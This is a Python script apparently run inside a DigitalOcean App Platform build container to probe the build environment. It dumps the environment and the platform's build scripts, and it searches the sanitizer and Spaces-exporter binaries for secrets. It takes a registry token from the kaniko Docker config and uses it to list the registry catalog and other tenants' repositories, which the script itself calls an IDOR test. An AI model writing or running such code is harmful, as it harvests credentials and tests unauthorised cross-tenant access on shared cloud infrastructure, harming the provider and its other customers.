import json, os, socket, base64, subprocess

r = {}

# 1. Full build.sh and related scripts
for f in ['/.app_platform/build.sh', '/.app_platform/build-init.sh', '/.app_platform/util.sh',
          '/.app_platform/sensitive-sanitize-args.sh']:
    try:
        data = open(f).read()
        r[f'script_{os.path.basename(f)}_b64'] = base64.b64encode(data.encode()).decode()
    except Exception as e:
        r[f'script_{os.path.basename(f)}'] = str(e)[:100]

# 2. Build metadata
try:
    meta_dir = '/.app_platform/.build_metadata'
    for root, dirs, files in os.walk(meta_dir):
        for f in files:
            fp = os.path.join(root, f)
            try:
                r[f'meta_{fp}'] = open(fp).read()[:500]
            except: pass
except: pass
try:
    meta_dir = '/.app_platform/metadata'
    for root, dirs, files in os.walk(meta_dir):
        for f in files:
            fp = os.path.join(root, f)
            try:
                r[f'meta_{fp}'] = open(fp).read()[:500]
            except: pass
except: pass

# 3. Check /.app_platform/.tmp
try:
    r['app_tmp'] = os.listdir('/.app_platform/.tmp')
except: pass

# 4. exec-sanitize binary - what patterns does it sanitize?
try:
    out = subprocess.run(['strings', '/.app_platform/exec-sanitize'], capture_output=True, text=True, timeout=5)
    # Look for sanitization patterns
    interesting = [l for l in out.stdout.split('\n') if any(x in l.lower() for x in ['regex','pattern','replace','sanitize','redact','mask','registry','token','secret','key','auth','cred','password'])]
    r['sanitize_strings'] = interesting[:30]
except Exception as e:
    r['sanitize_strings'] = str(e)[:100]

# 5. spaces-exporter - DO Spaces credentials?
try:
    out = subprocess.run(['strings', '/.app_platform/spaces-exporter'], capture_output=True, text=True, timeout=5)
    interesting = [l for l in out.stdout.split('\n') if any(x in l.lower() for x in ['space','bucket','key','secret','endpoint','s3','aws'])]
    r['spaces_strings'] = interesting[:20]
except Exception as e:
    r['spaces_strings'] = str(e)[:100]

# 6. Full env dump (including Spaces creds from build.sh vars)
r['full_env'] = dict(os.environ)

# 7. Check /etc/hosts
try: r['hosts'] = open('/etc/hosts').read()
except: pass

# 8. DNS SRV records for build infra
for svc in ['_docker._tcp', '_registry._tcp', '_builder._tcp']:
    for ns in ['default', 'kube-system']:
        try:
            import socket as s
            result = s.getaddrinfo(f'{svc}.{ns}.svc.cluster.local', None)
            r[f'srv_{svc}_{ns}'] = str(result)[:200]
        except: pass

# 9. Can we access other apps' DOCR repos with our token?
try:
    import urllib.request, ssl
    ctx = ssl.create_default_context()
    cfg = json.loads(open('/kaniko/.docker/config.json').read())
    # Get any auth token
    token = None
    for host, creds in cfg.get('auths', {}).items():
        if 'registrytoken' in creds:
            token = creds['registrytoken']
            break
    if token:
        # Try to list the catalog
        req = urllib.request.Request('https://registry.digitalocean.com/v2/_catalog')
        req.add_header('Authorization', f'Bearer {token}')
        try:
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            r['catalog'] = resp.read().decode()[:2000]
        except Exception as e:
            r['catalog'] = str(e)[:300]
        # Try to list tags for our repo
        req2 = urllib.request.Request(f'https://registry.digitalocean.com/v2/apps-nyc3-aaad91f0-ab40-4d8a-a70b-9a6d47e4cb36/web/tags/list')
        req2.add_header('Authorization', f'Bearer {token}')
        try:
            resp = urllib.request.urlopen(req2, timeout=5, context=ctx)
            r['our_tags'] = resp.read().decode()[:500]
        except Exception as e:
            r['our_tags'] = str(e)[:300]
        # Try a different app's repo (IDOR test)
        for test_repo in ['apps-nyc3-test/web', 'apps-nyc/web', 'library/nginx']:
            req3 = urllib.request.Request(f'https://registry.digitalocean.com/v2/{test_repo}/tags/list')
            req3.add_header('Authorization', f'Bearer {token}')
            try:
                resp = urllib.request.urlopen(req3, timeout=5, context=ctx)
                r[f'idor_{test_repo}'] = resp.read().decode()[:500]
            except Exception as e:
                r[f'idor_{test_repo}'] = str(e)[:200]
except Exception as e:
    r['docr_test'] = str(e)[:200]

# 10. Check internal DOCR endpoint (apps-nyc.docr.space)
try:
    ip = socket.getaddrinfo('apps-nyc.docr.space', 443)[0][4][0]
    r['docr_space_ip'] = ip
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    rc = s.connect_ex((ip, 443))
    r['docr_space_tcp'] = 'OPEN' if rc == 0 else f'errno={rc}'
    s.close()
except Exception as e:
    r['docr_space'] = str(e)[:100]

print(json.dumps(r, indent=2, default=str))
